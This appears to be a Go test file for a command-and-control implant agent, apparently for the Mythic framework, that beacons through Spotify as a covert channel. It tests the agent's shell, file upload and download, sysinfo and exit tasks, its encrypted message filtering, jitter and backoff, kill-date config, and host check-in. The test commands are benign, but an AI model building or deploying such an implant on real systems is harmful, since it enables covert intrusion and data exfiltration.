package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/sourcefrenchy/spotexfil/pkg/mythicmap"
)

const (
	testUUID  = "11111111-2222-3333-4444-555555555555"
	otherUUID = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"
)

func testKey(t *testing.T) []byte {
	t.Helper()
	key, err := mythicmap.DecodeKey(base64.StdEncoding.EncodeToString([]byte("0123456789abcdef0123456789abcdef")))
	if err != nil {
		t.Fatalf("decode test key: %v", err)
	}
	return key
}

// ---------------------------------------------------------------------------
// executeTask
// ---------------------------------------------------------------------------

func TestExecuteTaskShell(t *testing.T) {
	out, status := executeTask("shell", `{"command":"echo hello-mythic"}`)
	if status != "success" {
		t.Fatalf("status = %q, want success (out=%q)", status, out)
	}
	if !strings.Contains(out, "hello-mythic") {
		t.Fatalf("output %q missing command output", out)
	}
}

func TestExecuteTaskSysinfo(t *testing.T) {
	out, status := executeTask("sysinfo", "")
	if status != "success" {
		t.Fatalf("status = %q, want success (out=%q)", status, out)
	}
	var info map[string]interface{}
	if err := json.Unmarshal([]byte(out), &info); err != nil {
		t.Fatalf("sysinfo output not JSON: %v", err)
	}
	if info["os"] == "" || info["hostname"] == "" {
		t.Fatalf("sysinfo missing fields: %v", info)
	}
}

func TestExecuteTaskUnknown(t *testing.T) {
	out, status := executeTask("bogus", "")
	if status != "error: unknown command bogus" {
		t.Fatalf("status = %q", status)
	}
	if !strings.Contains(out, "unknown command bogus") {
		t.Fatalf("output = %q", out)
	}
}

func TestExecuteTaskUploadBadB64(t *testing.T) {
	out, status := executeTask("upload", `{"path":"/tmp/mythicagent-test-x","content":"!!!not-base64!!!"}`)
	if !strings.HasPrefix(status, "error: ") {
		t.Fatalf("status = %q, want error: prefix", status)
	}
	if !strings.Contains(out, "base64") {
		t.Fatalf("output = %q, want base64 complaint", out)
	}
}

func TestExecuteTaskDownloadMissingFile(t *testing.T) {
	_, status := executeTask("download", "/nonexistent/mythicagent-nope")
	if !strings.HasPrefix(status, "error: ") {
		t.Fatalf("status = %q, want error: prefix", status)
	}
}

// ---------------------------------------------------------------------------
// filterForMe (pure UUID-filtering part of readForMe)
// ---------------------------------------------------------------------------

func TestFilterForMe(t *testing.T) {
	key := testKey(t)

	ours1, err := mythicmap.Encrypt(testUUID, key, []byte(`{"msg":"one"}`))
	if err != nil {
		t.Fatal(err)
	}
	ours2, err := mythicmap.Encrypt(testUUID, key, []byte(`{"msg":"two"}`))
	if err != nil {
		t.Fatal(err)
	}
	theirs, err := mythicmap.Encrypt(otherUUID, key, []byte(`{"msg":"foreign"}`))
	if err != nil {
		t.Fatal(err)
	}

	envelopes := map[int]string{
		10: ours1,
		20: theirs,
		30: ours2,
		40: "!!!not-base64!!!", // unparseable: skipped, not cleaned
	}

	mine, seqs, err := filterForMe(envelopes, testUUID, key)
	if err != nil {
		t.Fatalf("filterForMe: %v", err)
	}
	if len(mine) != 2 {
		t.Fatalf("got %d plaintexts, want 2", len(mine))
	}
	if string(mine[10]) != `{"msg":"one"}` || string(mine[30]) != `{"msg":"two"}` {
		t.Fatalf("wrong plaintexts: %v", mine)
	}
	if len(seqs) != 2 || seqs[0] != 10 || seqs[1] != 30 {
		t.Fatalf("clean seqs = %v, want [10 30]", seqs)
	}
}

func TestFilterForMePlaintextMode(t *testing.T) {
	env, err := mythicmap.Encrypt(testUUID, nil, []byte("cleartext"))
	if err != nil {
		t.Fatal(err)
	}
	mine, seqs, err := filterForMe(map[int]string{7: env}, testUUID, nil)
	if err != nil {
		t.Fatalf("filterForMe: %v", err)
	}
	if string(mine[7]) != "cleartext" || len(seqs) != 1 || seqs[0] != 7 {
		t.Fatalf("mine=%v seqs=%v", mine, seqs)
	}
}

func TestFilterForMeNoneOurs(t *testing.T) {
	key := testKey(t)
	theirs, err := mythicmap.Encrypt(otherUUID, key, []byte("foreign"))
	if err != nil {
		t.Fatal(err)
	}
	mine, seqs, err := filterForMe(map[int]string{1: theirs}, testUUID, key)
	if err != nil {
		t.Fatalf("filterForMe: %v", err)
	}
	if len(mine) != 0 || len(seqs) != 0 {
		t.Fatalf("expected empty, got mine=%v seqs=%v", mine, seqs)
	}
}

// ---------------------------------------------------------------------------
// runOnce with a fake transport
// ---------------------------------------------------------------------------

type fakeTransport struct {
	uuid    string
	key     []byte
	inbox   map[int]string // seq -> envelope (what the profile wrote to cmd)
	sent    []string       // envelopes the agent wrote to res
	cleaned []int
	readErr error
}

func (f *fakeTransport) readForMe(ctx context.Context) (string, []byte, []int, error) {
	if f.readErr != nil {
		return "", nil, nil, f.readErr
	}
	mine, seqs, err := filterForMe(f.inbox, f.uuid, f.key)
	if err != nil {
		return "", nil, nil, err
	}
	if len(seqs) == 0 {
		return "", nil, nil, nil
	}
	latest := seqs[len(seqs)-1]
	return f.uuid, mine[latest], seqs, nil
}

func (f *fakeTransport) send(ctx context.Context, envelopeB64 string, seq int) error {
	f.sent = append(f.sent, envelopeB64)
	return nil
}

func (f *fakeTransport) clean(ctx context.Context, seqs []int) error {
	f.cleaned = append(f.cleaned, seqs...)
	return nil
}

// lastPostResponse decrypts the most recent envelope the agent sent and
// parses it as a post_response.
func lastPostResponse(t *testing.T, f *fakeTransport) postResponse {
	t.Helper()
	if len(f.sent) == 0 {
		t.Fatal("agent sent nothing")
	}
	uuid, pt, err := mythicmap.Decrypt(f.key, f.sent[len(f.sent)-1])
	if err != nil {
		t.Fatalf("decrypt sent envelope: %v", err)
	}
	if uuid != f.uuid {
		t.Fatalf("sent envelope uuid = %q, want %q", uuid, f.uuid)
	}
	var pr postResponse
	if err := json.Unmarshal(pt, &pr); err != nil {
		t.Fatalf("parse post_response: %v", err)
	}
	return pr
}

func TestRunOnceTwoTasks(t *testing.T) {
	key := testKey(t)

	respBody, err := json.Marshal(taskingResponse{
		Action: "get_tasking",
		Tasks: []mythicTask{
			{ID: 5, Command: "shell", Parameters: `{"command":"echo runonce-ok"}`},
			{ID: 6, Command: "bogus", Parameters: ""},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	env, err := mythicmap.Encrypt(testUUID, key, respBody)
	if err != nil {
		t.Fatal(err)
	}

	fake := &fakeTransport{uuid: testUUID, key: key, inbox: map[int]string{42: env}}
	var seq atomic.Int64

	processed, err := runOnce(context.Background(), fake, testUUID, key, &seq)
	if err != nil {
		t.Fatalf("runOnce: %v", err)
	}
	if processed != 2 {
		t.Fatalf("processed = %d, want 2", processed)
	}

	// First send = get_tasking request; verify its shape too.
	if len(fake.sent) != 2 {
		t.Fatalf("sent %d envelopes, want 2", len(fake.sent))
	}
	uuid, pt, err := mythicmap.Decrypt(key, fake.sent[0])
	if err != nil {
		t.Fatalf("decrypt get_tasking: %v", err)
	}
	if uuid != testUUID {
		t.Fatalf("get_tasking uuid = %q", uuid)
	}
	var req taskingRequest
	if err := json.Unmarshal(pt, &req); err != nil {
		t.Fatalf("parse get_tasking: %v", err)
	}
	if req.Action != "get_tasking" || req.TaskingSize != -1 {
		t.Fatalf("get_tasking = %+v", req)
	}

	pr := lastPostResponse(t, fake)
	if pr.Action != "post_response" {
		t.Fatalf("action = %q", pr.Action)
	}
	if len(pr.Responses) != 2 {
		t.Fatalf("responses = %d, want 2", len(pr.Responses))
	}
	r5, r6 := pr.Responses[0], pr.Responses[1]
	if r5.TaskID != 5 || r5.Status != "success" || !r5.Completed {
		t.Fatalf("task 5 response = %+v", r5)
	}
	if !strings.Contains(r5.UserOutput, "runonce-ok") {
		t.Fatalf("task 5 output = %q", r5.UserOutput)
	}
	if r6.TaskID != 6 || r6.Status != "error: unknown command bogus" || !r6.Completed {
		t.Fatalf("task 6 response = %+v", r6)
	}

	if len(fake.cleaned) != 1 || fake.cleaned[0] != 42 {
		t.Fatalf("cleaned = %v, want [42]", fake.cleaned)
	}
}

func TestRunOnceNoTasking(t *testing.T) {
	key := testKey(t)
	fake := &fakeTransport{uuid: testUUID, key: key, inbox: map[int]string{}}
	var seq atomic.Int64

	restore := shrinkPollKnobs()
	defer restore()

	processed, err := runOnce(context.Background(), fake, testUUID, key, &seq)
	if err != nil {
		t.Fatalf("runOnce: %v", err)
	}
	if processed != 0 {
		t.Fatalf("processed = %d, want 0", processed)
	}
	if len(fake.sent) != 1 { // only the get_tasking request
		t.Fatalf("sent %d envelopes, want 1", len(fake.sent))
	}
}

func TestRunOnceExit(t *testing.T) {
	key := testKey(t)
	exitRequested.Store(false)
	t.Cleanup(func() { exitRequested.Store(false) })

	respBody, _ := json.Marshal(taskingResponse{
		Action: "get_tasking",
		Tasks:  []mythicTask{{ID: 9, Command: "exit"}},
	})
	env, err := mythicmap.Encrypt(testUUID, key, respBody)
	if err != nil {
		t.Fatal(err)
	}
	fake := &fakeTransport{uuid: testUUID, key: key, inbox: map[int]string{1: env}}
	var seq atomic.Int64

	processed, err := runOnce(context.Background(), fake, testUUID, key, &seq)
	if err != nil {
		t.Fatalf("runOnce: %v", err)
	}
	if processed != 1 {
		t.Fatalf("processed = %d, want 1", processed)
	}
	if !exitRequested.Load() {
		t.Fatal("exitRequested not set")
	}
	pr := lastPostResponse(t, fake)
	if len(pr.Responses) != 1 || pr.Responses[0].TaskID != 9 ||
		pr.Responses[0].Status != "success" || !pr.Responses[0].Completed {
		t.Fatalf("exit response = %+v", pr.Responses)
	}
}

func TestRunOnceReadError(t *testing.T) {
	key := testKey(t)
	fake := &fakeTransport{uuid: testUUID, key: key, readErr: context.DeadlineExceeded}
	var seq atomic.Int64

	_, err := runOnce(context.Background(), fake, testUUID, key, &seq)
	if err == nil {
		t.Fatal("expected error")
	}
}

func shrinkPollKnobs() func() {
	oa, oi := taskPollAttempts, taskPollInterval
	taskPollAttempts, taskPollInterval = 2, time.Millisecond
	return func() { taskPollAttempts, taskPollInterval = oa, oi }
}

// ---------------------------------------------------------------------------
// backoff / jitter
// ---------------------------------------------------------------------------

func TestBackoff(t *testing.T) {
	base := 30 * time.Second
	cases := []struct {
		failures int
		want     time.Duration
	}{
		{-1, base},
		{0, base},
		{1, 60 * time.Second},
		{2, 120 * time.Second},
		{3, 240 * time.Second},
		{4, maxBackoff}, // 480s capped to 300s
		{100, maxBackoff},
	}
	for _, c := range cases {
		if got := backoff(base, c.failures); got != c.want {
			t.Errorf("backoff(%v, %d) = %v, want %v", base, c.failures, got, c.want)
		}
	}
}

func TestJitteredBounds(t *testing.T) {
	base, j := 30*time.Second, 10*time.Second
	for i := 0; i < 200; i++ {
		d := jittered(base, j)
		if d < base-j || d > base+j {
			t.Fatalf("jittered out of bounds: %v", d)
		}
	}
	if got := jittered(base, 0); got != base {
		t.Fatalf("jittered(base, 0) = %v, want %v", got, base)
	}
	if got := jittered(0, 0); got != minSleep {
		t.Fatalf("jittered(0, 0) = %v, want floor %v", got, minSleep)
	}
}

// ---------------------------------------------------------------------------
// config parse
// ---------------------------------------------------------------------------

// withStamped swaps the stamped globals for the duration of a test.
func withStamped(t *testing.T, mutate func()) {
	t.Helper()
	saved := map[string]*string{
		PayloadUUID:         &PayloadUUID,
		AESKeyB64:           &AESKeyB64,
		Passphrase:          &Passphrase,
		SpotifyUsername:     &SpotifyUsername,
		SpotifyClientID:     &SpotifyClientID,
		SpotifyClientSecret: &SpotifyClientSecret,
		SpotifyRedirectURI:  &SpotifyRedirectURI,
		SpotifyTokenFile:    &SpotifyTokenFile,
		Interval:            &Interval,
		Jitter:              &Jitter,
		KillDate:            &KillDate,
	}
	orig := map[string]string{}
	for v, p := range saved {
		orig[v] = *p
	}
	t.Cleanup(func() {
		for v, p := range saved {
			*p = orig[v]
		}
	})

	PayloadUUID = testUUID
	AESKeyB64 = ""
	Passphrase = "transport-key"
	SpotifyUsername = "user"
	SpotifyClientID = "id"
	SpotifyClientSecret = "secret"
	SpotifyRedirectURI = "http://127.0.0.1:8888/callback"
	SpotifyTokenFile = ""
	Interval = ""
	Jitter = ""
	KillDate = ""
	if mutate != nil {
		mutate()
	}
}

func TestParseConfigDefaults(t *testing.T) {
	withStamped(t, nil)
	cfg, err := parseConfig()
	if err != nil {
		t.Fatalf("parseConfig: %v", err)
	}
	if cfg.interval != 30*time.Second {
		t.Fatalf("interval = %v, want 30s", cfg.interval)
	}
	if cfg.jitter != 10*time.Second {
		t.Fatalf("jitter = %v, want 10s", cfg.jitter)
	}
	if cfg.key != nil {
		t.Fatalf("key = %v, want nil (plaintext mode)", cfg.key)
	}
	if !cfg.killDate.IsZero() {
		t.Fatalf("killDate = %v, want zero", cfg.killDate)
	}
}

func TestParseConfigIntervalFloor(t *testing.T) {
	withStamped(t, func() { Interval = "5" })
	cfg, err := parseConfig()
	if err != nil {
		t.Fatalf("parseConfig: %v", err)
	}
	if cfg.interval != 20*time.Second {
		t.Fatalf("interval = %v, want floor 20s", cfg.interval)
	}
}

func TestParseConfigJitterClamp(t *testing.T) {
	withStamped(t, func() { Interval = "30"; Jitter = "100" })
	cfg, err := parseConfig()
	if err != nil {
		t.Fatalf("parseConfig: %v", err)
	}
	if cfg.jitter != 30*time.Second {
		t.Fatalf("jitter = %v, want clamp to interval 30s", cfg.jitter)
	}

	withStamped(t, func() { Jitter = "-5" })
	cfg, err = parseConfig()
	if err != nil {
		t.Fatalf("parseConfig: %v", err)
	}
	if cfg.jitter != 0 {
		t.Fatalf("jitter = %v, want clamp to 0", cfg.jitter)
	}
}

func TestParseConfigKillDate(t *testing.T) {
	withStamped(t, func() { KillDate = "2030-06-01T12:00:00Z" })
	cfg, err := parseConfig()
	if err != nil {
		t.Fatalf("parseConfig: %v", err)
	}
	want, _ := time.Parse(time.RFC3339, "2030-06-01T12:00:00Z")
	if !cfg.killDate.Equal(want) {
		t.Fatalf("killDate = %v, want %v", cfg.killDate, want)
	}

	withStamped(t, func() { KillDate = "not-a-date" })
	if _, err := parseConfig(); err == nil {
		t.Fatal("expected error for bad KillDate")
	}
}

func TestParseConfigKey(t *testing.T) {
	good := base64.StdEncoding.EncodeToString([]byte("0123456789abcdef0123456789abcdef"))
	withStamped(t, func() { AESKeyB64 = good })
	cfg, err := parseConfig()
	if err != nil {
		t.Fatalf("parseConfig: %v", err)
	}
	if len(cfg.key) != 32 {
		t.Fatalf("key len = %d, want 32", len(cfg.key))
	}

	withStamped(t, func() { AESKeyB64 = base64.StdEncoding.EncodeToString([]byte("short")) })
	if _, err := parseConfig(); err == nil {
		t.Fatal("expected error for short key")
	}
}

func TestParseConfigMissingUUID(t *testing.T) {
	withStamped(t, func() { PayloadUUID = "too-short" })
	if _, err := parseConfig(); err == nil {
		t.Fatal("expected error for bad PayloadUUID")
	}
}

// ---------------------------------------------------------------------------
// checkin message
// ---------------------------------------------------------------------------

func TestBuildCheckin(t *testing.T) {
	body, err := buildCheckin(testUUID)
	if err != nil {
		t.Fatalf("buildCheckin: %v", err)
	}
	var msg checkinMessage
	if err := json.Unmarshal(body, &msg); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if msg.Action != "checkin" {
		t.Fatalf("action = %q", msg.Action)
	}
	if msg.UUID != testUUID {
		t.Fatalf("uuid = %q", msg.UUID)
	}
	switch msg.OS {
	case "darwin", "linux", "windows":
	default:
		t.Fatalf("os = %q", msg.OS)
	}
	switch msg.Architecture {
	case "x64", "arm64", "x86":
	default:
		t.Fatalf("architecture = %q", msg.Architecture)
	}
	if msg.ProcessName == "" || msg.User == "" || msg.PID <= 0 {
		t.Fatalf("missing fields: %+v", msg)
	}
}

func TestMythicArch(t *testing.T) {
	if got := mythicArch(); got == "" {
		t.Fatal("empty arch")
	}
}
